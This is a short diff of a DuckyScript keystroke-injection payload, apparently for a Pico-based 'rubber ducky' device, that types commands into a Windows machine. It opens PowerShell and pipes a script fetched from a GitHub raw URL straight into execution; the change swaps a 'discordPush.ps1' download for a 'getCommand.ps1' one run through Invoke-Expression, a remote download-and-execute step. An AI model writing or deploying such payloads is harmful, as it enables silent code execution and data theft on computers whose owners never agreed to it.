@@ -4,7 +4,7 @@ DELAY 200
 STRING powershell
 ENTER
 DELAY 500
-STRING iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/discordPush.ps1 | iex
+STRING Invoke-RestMethod -Uri "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/getCommand.ps1" -Headers @{"Cache-Control"="no-cache"}| Invoke-Expression
 ENTER
 DELAY 50
 STRING exit
